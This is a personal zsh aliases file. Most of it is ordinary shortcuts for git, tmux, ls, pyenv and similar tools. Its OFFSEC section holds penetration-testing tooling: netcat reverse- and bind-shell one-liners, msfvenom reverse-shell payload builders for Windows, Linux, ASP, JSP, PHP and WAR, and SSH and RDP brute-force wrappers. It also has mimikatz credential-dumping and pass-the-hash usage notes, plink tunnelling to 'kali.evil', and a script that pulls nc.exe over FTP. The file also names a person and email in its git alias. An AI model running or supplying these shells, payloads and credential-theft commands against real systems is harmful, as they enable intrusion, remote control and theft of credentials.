#!/usr/bin/env zsh

# # Overridden commands ###
alias mkdir="mkdir -pv"
alias less="less -R"
alias ls="ls -hpG"
alias sudo="sudo "
alias wget="wget -c"
### Safer commands ###
alias mv="mv -i"
alias cp="cp -i"
alias ln="ln -i"
alias rm="rm -I"
### Enhanced commands ###
alias l.="ls -d .*"
alias la="ls -lAh"
alias ll="ls -lah"
alias ldir="ls -d */"
alias lt='du -sh * | sort -h'
### Shortcuts ###
alias ff="find . -type f -name"
alias fd="find . -type d -name"
alias h="history"
alias h1="history 10"
alias h2="history 20"
alias h3="history 30"
alias hgrep="history | grep"
alias hd='hexdump -C'
alias j='jobs -l'
alias ckear="clear"
alias c="clear"
alias cl="clear"
alias clr="clear"
alias cls="clear"
alias dircount="ls -1 | wc -l"
alias dc="dircount"
alias xml='xmllint --format -'
alias paux='ps aux | grep'
alias sai="sudo apt-get install"
alias sau="sudo apt-get update"
alias svi='sudo vim'
alias edit='vim'
alias y='yes'

### Useful Commands ###
alias beep='echo -e "\a\c"'
alias beep-lots='while :; do beep; sleep .5; done'
alias br="source $HOME/.bashrc"
alias zr="source $HOME/.zshrc"
alias omzr="source $HOME/.oh-my-zsh/oh-my-zsh.sh"
alias p10kr="source $HOME/.p10k.zsh"

### Pretty commands
alias pretty-path='echo -e ${PATH//:/\\n}'
alias pretty-mount='mount |column -t'
alias echo-mount="pretty-mount"
alias echo-path="pretty-path"
alias vmount="pretty-mount"
alias vpath="pretty-path"

### Useless stuff ###
#alias lostterm='export PS1="\[\033[01;32m\]>: "'
alias busy="cat /dev/urandom | hexdump -C | grep 'ca fe'"

### User Definitions ###
alias chmod-setgid="chmod g+s"
alias cpy="xclip -selection clipboard"
alias curl-follow="curl -O -J -L"
alias du1="du -d1"
alias du-usage='du -ch | grep total'
alias find-by-name-indir="find . -iname "
alias find-by-name-root="find / -iname "
alias fixcut='tr -s " "'
alias gcc-dev="gcc -g -Wall -Wextra -Winline"
alias grep_for_text="grep -inrI "
alias hd_health='find /dev -regex "/dev/sd." -exec smartctl -l selftest {} \;'
alias header='curl -I'
alias headtail5="sed -ne'1,4{p;b};5{x;s/$/.../;x;G;p;b};:a;$p;N;11,$D;ba'"
alias headtail10="sed -ne'1,9{p;b};10{x;s/$/.../;x;G;p;b};:a;$p;N;21,$D;ba'"
alias ls-size="ll -lAS && echo '-------------Smallest-----'"
alias ls-time="ls -lAt && echo '-------------Oldest-----'"
alias most="du -hsx * | sort -rh | head -10"
alias ovpn-addr="ip -f inet addr show $INTERFACE | grep inet[^6] | egrep -o \"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\" | head -n1"
alias rsync-copy="rsync -avhP"
#alias sort_dir_by_size="du -ha --max-depth=1 | sort -h"
alias trim='awk '\''{$1=$1};1'\'''
alias wget-mirror-page="wget -p -k"

####################
###   Software   ### 
####################

### 7zip ###
alias 7z-extracthere="7z e "
alias 7z-unarchive="7z x "
alias 7z-cmax="7z a -t7z -m0=lzma -mx=9 "
alias 7z-cextreme="7z a -t7z -m0=lzma -mx=9 -md=32m -ms=on "

### brew ### 
alias brewa="arch -arm64 brew "
alias brewai="arch -arm64 brew install"
alias brewarm="arch -arm64 brew "
alias brewarmi="arch -arm64 brew install"
alias brewls="brew list"

### cd ###
alias ccd="cd"
alias cd..="cd .."
alias ..="cd .."
alias ...="cd ../../../"
alias ....="cd ../../../../"
alias .....="cd ../../../../"
alias .4="cd ../../../../"
alias .5="cd ../../../../.."
alias desk="cd ~/Desktop"
alias down="cd ~/Downloads"
alias cdzcustom="cd ~/.oh-my-zsh/custom/"
alias cdc="cd /mnt/c/"
alias cdc-home="cd /mnt/c/Users/$USER"
alias cdc-desk="cd /mnt/c/Users/$USER/Desktop"
alias cdc-down="cd /mnt/c/Users/$USER/Downloads"

### date ###
alias now='date +"%T"'
alias nowtime="now"
alias nowdate='date +"%d-%m-%Y"'

### Docker ###
#alias dl="sudo docker ps -l -q"
#alias dps="sudo docker ps"
#alias di="sudo docker images"
#alias dip="sudo docker inspect --format '{{ .NetworkSettings.IPAddress }}'"
#alias dkd="sudo docker run -d -P"
#alias dki="sudo docker run -i -t -P"
#alias dex="sudo docker exec -i -t"
#alias drmf="sudo docker stop $(sudo docker ps -a -q) && sudo docker rm $(sudo docker ps -a -q)"

### exit ### 
alias :q="exit"
alias bye="exit"
alias die="exit"
alias quit="exit"

### git ###
alias git-init='git config user.email tbennett6421@gmail.com && git config user.name "Tyler Bennett" && git config core.editor vim && git config diff.tool vimdiff && git config difftool.prompt false'
alias git-diff-head="git diff HEAD "
alias git-revert-file="git checkout HEAD -- "
alias git-set-ssh="git remote set-url origin "
alias git-top="git rev-parse --show-toplevel"
alias get='git'
alias gti='git'
alias clone='git clone'
alias merge='git merge'
alias pull='git pull'
alias push='git push'
alias amend='git commit --amend'
alias checkout="git checkout"
alias stash="git stash"
alias gs='git status'
alias ga="git add"
alias gc="git commit"
alias gca="git commit -a"
alias gcm="git commit -m"
alias gcd="git-top"
alias gl="git log"
alias gfa='git fetch --all'
alias gcot="git checkout"
alias gchekout="git checkout"
alias gchckout="git checkout"
alias gpsh="git push -u origin"
alias grf="git checkout HEAD -- "
alias gstash="git stash"
alias gw="git whatchanged"

### iptables ### 
alias ipt='iptables'
alias iptlist='iptables -L -n -v --line-numbers'
alias iptlistin='iptables -L INPUT -n -v --line-numbers'
alias iptlistout='iptables -L OUTPUT -n -v --line-numbers'
alias iptlistfw='iptables -L FORWARD -n -v --line-numbers'

### nc ### 
alias nc-trad-rev='nc -nv -e /bin/sh $RHOST $RPORT'
alias nc-trad-bind='nc -nv -e /bin/sh -l $LPORT'
alias nc-trad-rev='nc -nv -e /bin/bash $RHOST $RPORT'
alias nc-trad-rev='nc -nv -e /bin/bash -l $LPORT'
alias nc-sh-rev='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -nv $RHOST $RPORT >/tmp/f'
alias nc-sh-bind='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -nvl $LPORT >/tmp/f'
alias nc-bash-rev='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -nv $RHOST $RPORT >/tmp/f'
alias nc-bash-bind='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -nvl $LPORT >/tmp/f'

### nmap ###
alias nmap-quick='sudo -E nmap $RHOST -vv -n --open --reason -sC -sV -sS -F -oA $RHOST"_nmap_quick"'
alias nmap-full='sudo -E nmap $RHOST -vv -n --open --reason -sC -sV -sS -p- -O -oA $RHOST"_nmap_full"'
alias nmap-udp='sudo -E nmap $RHOST -vv -n --open --reason -sC -sV -sU --top-ports 20 -O -oA $RHOST"_nmap_udp"'

### openssl ###
alias md5="openssl md5"
alias sha1="openssl sha1"
alias sha256="openssl sha256"
alias sha512="openssl sha512"
alias x509-details="openssl x509 -text -in "
alias rsa-to-pub="openssl rsa -pubout -out - -in "

### pip ###
alias pipr="pip install -r requirements.txt"

### pyenv ###
alias pyg="pyenv global"
alias pyi27="pyenv install 2.7.18"
alias pyi36="pyenv install 3.6.15"
alias pyi38="pyenv install 3.8.13"
alias pyi-list="pyenv install -l"
alias pyi-search="pyenv install -l | grep"
alias pyl="pyenv local"
alias pyu="pyenv uninstall "
alias pyver="pyenv version"
alias pyvers="pyenv versions"
alias py-virt-new="pyenv virtualenv "
alias py-virt-ls="pyenv virtualenvs"
alias pywhich="pyenv which"
alias pyw="pyenv which"

### python ###
alias serve2="python -m SimpleHTTPServer"
alias serve3="python3 -m http.server"

### salt ###
alias salt-alive="salt '*' test.ping"
alias salt-applystate="salt '*' state.apply"
alias salt-targetwindows="salt -C 'G@os:Windows' "
alias salt-slowly="salt -b 1 --batch-wait 60 "
alias salt-crawl="salt -b 1 --batch-wait 360 "

### ssh ###
alias genkey="ssh-keygen -t rsa -b 4096"
alias keytopub="ssh-keygen -y -f"
alias fingerprint="ssh-keygen -lf"
alias sshcpi="ssh-copy-id"
alias cpkey="pbcopy < ~/.ssh/id_rsa.pub"
alias sockstunnel="ssh -D 1080 "

### screen ###
alias screen-attach="screen -Rd"
alias screen-reattach="screen -Rd"
alias screen-list="screen -ls"
alias screen-new="screen -S "
alias sa="screen-attach"
alias sl="screen-list"
alias sls="screen-list"
alias sn="screen-new"

### tcpdump ###
alias tcpdump-capturering="tcpdump -C 1G -W 5 -s0 -w /tmp/ring.pcap "
alias tcpdump-capturescreen="tcpdump -s0 -n -X "

### tmux ###
alias tmux-list-sessions="tmux list-sessions"
alias tmux-reattach="tmux-reattach-session"
alias tmux-reload="tmux source-file $HOME/.tmux.conf"
alias edit-tmux-local="$EDITOR $HOME/.tmux.conf"
alias edit-tmux-remote="$EDITOR $HOME/.tmux/tmux.remote.conf"
alias ta="tmux-reattach"
alias tad="tmux-reattach"
alias tra="tmux-reattach"
alias trl="tmux-reload"
alias tl="tmux-list-sessions"          #Displays a list of running tmux sessions
alias tls="tmux-list-sessions"         #Displays a list of running tmux sessions
#alias tksv="tmux kill-server"          #Terminate all running tmux sessions
#alias tkss="tmux kill-session -t "     #Terminate named running tmux session

### usage ###
alias usage-ansible-usage="echo ansible -u<user> -i<inventory> -C<dry-run> -k<ask-ssh> -K<ask-become> -m<module> -a<module-args>"
alias usage-ansible-playbook-usage="echo ansible-playbook -u<user> -i<inventory> -C<dry-run> -k<ask-ssh> -K<ask-become> --step<pause-between-tasks> playbook.yml"
alias usage-mergecap="echo mergecap -w merged.pcap data/*.pcap*"
alias usage-tcpdump="echo tcpdump -c<count> -C<filesize> -G<rotate-seconds> -i<interface> -n<do-not-convert-numbers> -r<source.pcap> -s<snaplen> -w<output-filename> -W<rotate-filecount> -X<print-packet-ascii-hex>"

### venv ###
alias ve="python -m venv ./env"
alias va="source ./env/bin/activate"
alias vde="deactivate"

### vscode ###
alias vsc="code ."                  # Open the current folder in VS code
alias vsca="code --add "            # Add folder(s) to the last active window
alias vscd="code --diff"            # Compare two files with each other.
alias vscg="code --goto"            # Open a filespec file:line[:char]
alias vscn="code --new-window"      # Force to open a new window.
alias vscr="code --reuse-windows"   # Force to open a file or folder in the last active window.
alias webify="mogrify -resize 690\> *.png"
alias whatismyip="curl icanhazip.com"

### OFFSEC ###
export OFFKIT="/offsec/git/snare-ng"
export OFFSTAGE="/offsec/stage"

# enumeration
alias enum_dns_zone="$OFFKIT/Enumeration/DNS/enum-domain-zone.sh "
alias enum_dns_bruteforce="$OFFKIT/Enumeration/DNS/enum-domain-bruteforce.sh "
alias enum_dns_ip="$OFFKIT/Enumeration/DNS/enum-ip-sweep.sh "
alias enum_linrpc="$OFFKIT/Enumeration/RPCUNIX/rpcinfo.sh "
alias enum_smb_enum4linux="$OFFKIT/Enumeration/SMB/enum4linux.sh "
alias enum_smb_nbtscan="$OFFKIT/Enumeration/SMB/nbtscan.sh "
alias enum_smb_rpcclient="$OFFKIT/Enumeration/SMB/rpcclient.sh "
alias enum_snmp_161="$OFFKIT/Enumeration/SNMP/onesixtyone-enum.sh"
alias enum_snmp_check="$OFFKIT/Enumeration/SNMP/snmp-check.sh"
alias enum_snmp_walk="$OFFKIT/Enumeration/SNMP/snmpwalk.sh"
alias enum_ssh="$OFFKIT/Enumeration/SSH/ssh-enum.sh "
alias enum_http="$OFFKIT/Enumeration/WEB/http-enum.sh "
alias enum_nse_ftp="$OFFKIT/Enumeration/FTP/ftp.nse.sh "
alias enum_nse_imap="$OFFKIT/Enumeration/IMAP/imap.nse.sh "
alias enum_nse_pop="$OFFKIT/Enumeration/POP/pop-nse.sh "
alias enum_nse_smb="$OFFKIT/Enumeration/SMB/smb-nse.sh "
alias enum_nse_smtp="$OFFKIT/Enumeration/SMTP/smtp-nse.sh "

# busting
alias bust_http="$OFFKIT/Enumeration/WEB/http-busting.sh "

# bruteforcing
alias brute_ftp_hydra="$OFFKIT/Enumeration/FTP/ftp-bruteforce.sh "
alias brute_ssh_medusa="$OFFKIT/Enumeration/SSH/ssh-brute-medusa.sh "
alias brute_ssh_hydra="$OFFKIT/Enumeration/SSH/ssh-brute-hydra.sh "
alias brute_ssh_ncrack="$OFFKIT/Enumeration/SSH/ssh-brute-ncrack.sh "
alias brute_rdp_crowbar="crowbar -b rdp -n 1 -s $RHOST "

# Generation tools
alias gen-wordlist="cewl -m 6 -w cewl-wordlist.txt $URL"

# Proxy/Tunnel/Pivot
# The following relies heavily on env_vars and specific ones
# The following example should be used
# 1.1.1.1 srv1
# 2.2.2.2 dc1
# 3.3.3.3 kali
# :: ephemeral ports
#
#    local -L 3.3.3.3:1337:2.2.2.2:445 user@1.1.1.1
#    3.3.3.3:1337 --> 22:1.1.1.1:: --> 2.2.2.2:445
#       LHOST=3.3.3.3
#       RHOST=2.2.2.2
#       LPORT=1337
#       RPORT=445
#       SPROXY=1.1.1.1
#       SUSER=user
#
#    remote -R 3.3.3.3:1337:2.2.2.2:445 kali@3.3.3.3 (as run from 1.1.1.1)
#       LHOST=3.3.3.3
#       RHOST=2.2.2.2
#       LPORT=1337
#       RPORT=445
#       SPROXY=3.3.3.3
#       SUSER=kali
#
# LHOST=Offensive Machine
# RHOST=The final destination
# LPORT=The bound port to be translated (1337)
# RPORT=The translated port ()
# SPROXY=The remote endpoint that we establish SSH to
# SUSER=The remote username that we establish SSH with

alias ssh-local-portfwd="ssh -N -L $LHOST:$LPORT:$RHOST:$RPORT $SUSER@$SPROXY"
alias ssh-remote-portfwd="ssh -N -R $LHOST:$LPORT:$RHOST:$RPORT $SUSER@$LHOST"
alias ssh-socks4proxy="ssh -N -D $LHOST:$LPORT $SUSER@$SPROXY"

# other tools
alias gcc-winpe='i686-w64-mingw32-gcc '
alias john-unix="john --format=crypt "
alias john-winlm="john --format=LM "
alias john-winntlm="john --format=NTLM "
alias smtp_vrfy="$OFFKIT/Enumeration/SMTP/smtp-auth.sh "
alias upgrade-shell="python -c 'import pty; pty.spawn(\"/bin/bash\")'"
alias venom_stage_win_x86="msfvenom -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > shell-x86.exe"
alias venom_stage_win_x64="msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > shell-x64.exe"
alias venom_sless_win_x86="msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > shell-x86.exe"
alias venom_sless_win_x64="msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > shell-x64.exe"
alias venom_stage_winps_x86="msfvenom -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f powershell > shell-x86.ps1"
alias venom_stage_winps_x64="msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f powershell > shell-x64.ps1"
alias venom_sless_winps_x86="msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f powershell > shell-x86.ps1"
alias venom_sless_winps_x64="msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f powershell > shell-x64.ps1"
alias venom_stage_lin_x86="msfvenom -p linux/x86/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > shell-x86.elf"
alias venom_stage_lin_x64="msfvenom -p linux/x64/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > shell-x64.elf"
alias venom_sless_lin_x86="msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > shell-x86.elf"
alias venom_sless_lin_x64="msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > shell-x64.elf"
alias venom_asp="msfvenom -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f asp > shell.asp"
alias venom_jsp="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw > shell.jsp"
alias venom_php="msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw > shell.php"
alias venom_war="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war > shell.war"
#todo: smb-map

#todo: impacket
alias impacket-launchsmbserver='python smbserver.py NOPEROPE /offsec/stage'

#todo: my-ftp/http/staging-area

# attacking resources
alias service-run-smb='impacket-launchsmbserver'

# offsec commands
alias ostage="cp -t $OFFSTAGE -R "

# usage

alias usage-crunch='
echo crunch <MIN> <MAX> -t <MASK>
echo , => Upper
echo @ => lower
echo ^ => Special
echo % => Numeric
'
alias usage-mimikatz-logonpasswords='
echo log C:\\Windows\\Temp\\mimi-creds.log
echo privilege::debug 
echo sekurlsa::logonpasswords
echo exit
'
alias usage-mimikatz-tickets='
echo log C:\\Windows\\Temp\\mimi-tickets.log
echo privilege::debug 
echo sekurlsa::tickets
echo exit
'
alias usage-mimikatz-lsadump='
echo log C:\\Windows\\Temp\\mimi-lsa.log
echo privilege::debug 
echo token::elevate
echo lsadump::sam
echo exit
'
alias usage-pth-winexe='
echo pth-winexe -U DOM/USER%aad3b435b51404eeaad3b435b51404ee:NTLM_HASH //TARGET cmd
echo pth-winexe -U DOM/USER%LM_HASH:NTLM_HASH //TARGET cmd
'

alias usage-ssh-local-portfwde='
echo "ssh -N -L <bind_addr>:<bind_port>:<target_addr>:<target_port> username@sshproxy.com"
echo "ssh -N -L kali:445:dc1:445 kali@bounce"
echo "-- kali:445 ---> 22:bounce:Ephermal --> 445:dc1"
'

alias usage-ssh-remote-portfwd='
echo "ssh -N -R <bind_addr>:<bind_port>:<target_addr>:<target_port> username@sshproxy.com"
echo "ssh -N -R kali:4444:127.0.0.1:3306 kali@kali"
echo "-- localhost:3306 <-- 4444:kali"
echo "ssh -N -R kali:4444:sql:3306 kali@kali"
echo "-- sql:3306 <-- Ephemeral:localhost:22 <-- 4444:kali"
'
alias usage-plink-remote-portfwd='
echo "cmd.exe /c echo y | plink.exe -ssh -l <user> -pw <pass> -R <bind_addr>:<bind_port>:<target_addr>:<target_port> <proxy>"
echo "cmd.exe /c echo y | plink.exe -ssh -l offsec -pw offsec -R kali.evil:1337:127.0.0.1:3306 kali.evil"
echo "-- localhost:3306 <-- 1337:kali"
'

alias usage-netsh-forward='
echo # 1. Create proxy
echo "netsh interface portproxy add v4tov4 listenport=<local_port> listenaddress=<local_addr> connectport=<remote_port> connectaddress=<remote_addr>"
echo "netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110"
echo 
echo # 2. Create firewall rule
echo "netsh advfirewall firewall add rule name=\"<name>\" protocol=<proto> dir=<in|out> localip=<local_addr> localport=<local_port> action=allow"
echo "netsh advfirewall firewall add rule name=\"forward_port_rule\" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow"
echo 
echo "-- kali:445 --> 4455:10.11.0.22:: --> 445:192.168.1.110"
'

alias usage-winftp='
echo "echo open 10.11.0.4 21 > ftp.txt"
echo "echo USER offsec>> ftp.txt"
echo "echo lab>> ftp.txt"
echo "echo bin >> ftp.txt"
echo "echo GET nc.exe >> ftp.txt"
echo "echo bye >> ftp.txt"
echo "ftp -v -n -s:ftp.txt"
'


### logstash ###
### zeek ###
### zfs ###


### Conditional Aliases ###
if command -v lsb_release &> /dev/null
then
    if [[ $(lsb_release -i) == *Kali* ]]
    then
        alias nautilus="thunar"
    fi
fi

